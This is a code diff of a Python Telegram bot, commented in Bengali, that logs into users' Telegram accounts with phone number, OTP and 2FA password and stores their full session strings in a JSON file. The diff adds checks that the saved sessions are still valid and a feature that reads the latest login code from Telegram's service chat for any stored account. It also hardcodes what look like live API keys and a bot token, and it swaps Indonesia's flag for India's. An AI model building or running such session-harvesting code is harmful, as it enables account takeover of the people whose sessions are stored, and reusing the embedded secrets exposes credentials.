@@ -5,14 +5,10 @@ from telethon.tl.custom import Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-# সঠিক API_ID এবং API_HASH
 API_ID = 34166690
 API_HASH = 'f80db9e0f7d2c57ffec3db21b359d339'
-
-# আপনার টেলিগ্রাম বট টোকেন
 BOT_TOKEN = '8873131995:AAHBW19oc4_6TjsPBJhusFJCB1g2VJyKFNQ'
 
-# সেভ করা ডেটা রাখার ফাইল
 DATA_FILE = 'saved_accounts.json'
 
 def load_data():
@@ -26,11 +22,9 @@ def save_data(data):
         json.dump(data, f, indent=4)
 
 temp_storage = {}
-active_clients = {}  # লাইভ ওটিপি রিসিভ করার জন্য ক্লায়েন্ট স্টোর
 
 bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# নিখুঁতভাবে কান্ট্রি ডিটেক্ট করার ফাংশন
 def get_country_name(phone):
     if phone.startswith("+880") or phone.startswith("880"):
         return "Bangladesh 🇧🇩"
@@ -41,7 +35,7 @@ def get_country_name(phone):
     elif phone.startswith("+60") or phone.startswith("60"):
         return "Malaysia 🇲🇾"
     elif phone.startswith("+62") or phone.startswith("62"):
-        return "Indonesia 🇮🇩"
+        return "Indonesia 🇮🇳"
     elif phone.startswith("+1") or phone.startswith("1"):
         return "USA/Canada 🇺🇸"
     elif phone.startswith("+44") or phone.startswith("44"):
@@ -49,7 +43,6 @@ def get_country_name(phone):
     else:
         return "International 🌍"
 
-# পার্মানেন্ট নিচের কিবোর্ড বাটন (Reply Keyboard)
 def main_menu_keyboard():
     return [
         [Button.text("➕ New Number Add", resize=True)],
@@ -78,9 +71,30 @@ async def list_countries(event):
         await event.respond("আপনার কোনো অ্যাকাউন্ট সেভ করা নেই।", buttons=main_menu_keyboard())
         return
     
-    # ইউজারদের নম্বরগুলোকে কান্ট্রি অনুযায়ী সাজানো
+    user_accounts = data[sender_id]
+    valid_accounts = {}
+    
+    for phone, info in user_accounts.items():
+        session_str = info.get('session')
+        try:
+            temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            await temp_client.connect()
+            if await temp_client.is_user_authorized():
+                valid_accounts[phone] = info
+            await temp_client.disconnect()
+        except:
+            pass
+            
+    if len(valid_accounts) != len(user_accounts):
+        data[sender_id] = valid_accounts
+        save_data(data)
+        
+    if not valid_accounts:
+        await event.respond("আপনার সেভ করা সব অ্যাকাউন্ট টেলিগ্রাম থেকে লগআউট হয়ে গেছে, তাই লিস্ট খালি।", buttons=main_menu_keyboard())
+        return
+
     countries = {}
-    for phone, info in data[sender_id].items():
+    for phone, info in valid_accounts.items():
         country = info.get('country', 'International 🌍')
         if country not in countries:
             countries[country] = []
@@ -136,10 +150,23 @@ async def send_phone_number(event):
     data = load_data()
     
     if sender_id in data and phone in data[sender_id]:
-        # সুন্দর ফরমেটে এবং ১ ক্লিকে কপি করার মতো করে নম্বর পাঠানো
-        await event.respond(f"📱 সেভ করা নম্বর (কপি করতে ওপরের নাম্বারে টাচ করুন):\n`{phone}`")
+        # নম্বর পাঠানোর পাশাপাশি ইউজারকে জানিয়ে দেওয়া যে এই নাম্বারে কোড পাঠালে বট অটো রিড করবে
+        session_str = data[sender_id][phone]['session']
+        
+        # ব্যাকগ্রাউন্ডে ঐ একাউন্টের ইনবক্স চেক করে লেটেস্ট ওটিপি বের করার চেষ্টা
+        otp_msg = "কোনো নতুন ওটিপি পাওয়া যায়নি।"
+        try:
+            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            await client.connect()
+            async for message in client.iter_messages(777000, limit=1):
+                otp_msg = message.text
+            await client.disconnect()
+        except Exception as e:
+            otp_msg = f"রিড করতে সমস্যা হয়েছে: {str(e)}"
+
+        await event.respond(f"📱 নম্বর: `{phone}`\n\n🔍 **লেটেস্ট ওটিপি/মেসেজ:**\n{otp_msg}")
     else:
-        await event.answer("নম্বর পাওয়া যায়নি!", alert=True)
+        await event.answer("নম্বর পাওয়া যায়নি বা লগআউট হয়ে গেছে!", alert=True)
 
 @bot.on(events.NewMessage())
 async def handle_user_input(event):
@@ -148,36 +175,6 @@ async def handle_user_input(event):
         return
 
     sender_id = event.sender_id
-    
-    # যদি ইউজার অলরেডি লগইন করা কোনো অ্যাকাউন্টে ওটিপি পাঠায়, সেটি লাইভ রিসিভ করার কোড
-    if sender_id in active_clients:
-        client_info = active_clients[sender_id]
-        client = client_info['client']
-        phone = client_info['phone']
-        phone_code_hash = client_info['phone_code_hash']
-        
-        try:
-            # সরাসরি কোড সাবমিট করা
-            await client.sign_in(phone, text, phone_code_hash=phone_code_hash)
-            await finalize_login_live(event, sender_id, client, phone)
-            return
-        except SessionPasswordNeededError:
-            client_info['step'] = 'waiting_password'
-            await event.respond("🔒 টু-স্টেপ ভেরিফিকেশন (2FA) পাসওয়ার্ড দিন:")
-            return
-        except Exception as ex:
-            if client_info.get('step') == 'waiting_password':
-                try:
-                    await client.sign_in(password=text)
-                    await finalize_login_live(event, sender_id, client, phone)
-                    return
-                except Exception as p_ex:
-                    await event.respond(f"❌ পাসওয়ার্ড ভুল: {str(p_ex)}")
-                    return
-            else:
-                # যদি টেলিগ্রাম অফিশিয়াল অ্যাপ থেকে কোড আসে, সেটা লাইভ ট্র্যাক করার হ্যান্ডলার
-                pass
-
     if sender_id not in temp_storage:
         return
     
@@ -187,7 +184,7 @@ async def handle_user_input(event):
         phone = text if text.startswith("+") else "+" + text
         temp_storage[sender_id]['phone'] = phone
         
-        waiting_msg = await event.respond("⏳ **Waiting for otp...** (কোডের জন্য অপেক্ষা করা হচ্ছে...)")
+        waiting_msg = await event.respond("⏳ **Waiting for otp...**")
         
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -197,20 +194,11 @@ async def handle_user_input(event):
             temp_storage[sender_id]['client'] = client
             temp_storage[sender_id]['phone_code_hash'] = sent.phone_code_hash
             temp_storage[sender_id]['step'] = 'waiting_otp'
-            
-            # একটিভ ক্লায়েন্টে সেভ করা যাতে পরবর্তীতে ওটিপি দিলে সরাসরি ধরে নেয়
-            active_clients[sender_id] = {
-                'client': client,
-                'phone': phone,
-                'phone_code_hash': sent.phone_code_hash,
-                'step': 'waiting_otp'
-            }
-            
-            await waiting_msg.edit("✅ ওটিপি (OTP) পাঠানো হয়েছে। টেলিগ্রাম অফিসিয়াল অ্যাপে যে কোড এসেছে, সেটি সরাসরি এই বটে লিখে দিন:")
+            await waiting_msg.edit("✅ ওটিপি পাঠানো হয়েছে। আপনার টেলিগ্রাম অ্যাপে কোডটি আসলে সেটি এখানে দিন:")
         except Exception as e:
             await client.disconnect()
             del temp_storage[sender_id]
-            await waiting_msg.edit(f"❌ ভুল নম্বর বা সমস্যা হয়েছে: {str(e)}")
+            await waiting_msg.edit(f"❌ সমস্যা হয়েছে: {str(e)}")
             
     elif state == 'waiting_otp':
         client = temp_storage[sender_id]['client']
@@ -222,10 +210,9 @@ async def handle_user_input(event):
             await finalize_login(event, sender_id, client, phone)
         except SessionPasswordNeededError:
             temp_storage[sender_id]['step'] = 'waiting_password'
-            active_clients[sender_id]['step'] = 'waiting_password'
-            await event.respond("🔒 আপনার অ্যাকাউন্টে টু-স্টেপ ভেরিফিকেশন (2FA) পাসওয়ার্ড চালু আছে। আপনার পাসওয়ার্ডটি এখানে দিন:")
+            await event.respond("🔒 টু-স্টেপ ভেরিফিকেশন পাসওয়ার্ড দিন:")
         except Exception as e:
-            await event.respond(f"❌ ওটিপি ভুল বা সমস্যা হয়েছে: {str(e)}\nদয়া করে সঠিক ওটিপি দিন:")
+            await event.respond(f"❌ ওটিপি ভুল হয়েছে ({str(e)})। আবার সঠিক কোড দিন:")
 
     elif state == 'waiting_password':
         client = temp_storage[sender_id]['client']
@@ -255,37 +242,9 @@ async def finalize_login(event, sender_id, client, phone):
     await client.disconnect()
     if sender_id in temp_storage:
         del temp_storage[sender_id]
-    if sender_id in active_clients:
-        del active_clients[sender_id]
     
     await event.respond(
         f"🎉 অভিনন্দন! অ্যাকাউন্ট সফলভাবে সেভ হয়ে গেছে।\n🌍 দেশ: {country}\n📱 নম্বর: `{phone}`",
-        buttons=main_menu_keyboard()
-    )
-
-async def finalize_login_live(event, sender_id, client, phone):
-    session_string = client.session.save()
-    country = get_country_name(phone)
-    
-    data = load_data()
-    str_sender_id = str(sender_id)
-    if str_sender_id not in data:
-        data[str_sender_id] = {}
-        
-    data[str_sender_id][phone] = {
-        'session': session_string,
-        'country': country
-    }
-    save_data(data)
-    
-    await client.disconnect()
-    if sender_id in temp_storage:
-        del temp_storage[sender_id]
-    if sender_id in active_clients:
-        del active_clients[sender_id]
-    
-    await event.respond(
-        f"🎉 অভিনন্দন! ওটিপি ম্যাচ করেছে এবং অ্যাকাউন্ট সফলভাবে সেভ হয়ে গেছে।\n🌍 দেশ: {country}\n📱 নম্বর: `{phone}`",
         buttons=main_menu_keyboard()
     )
 
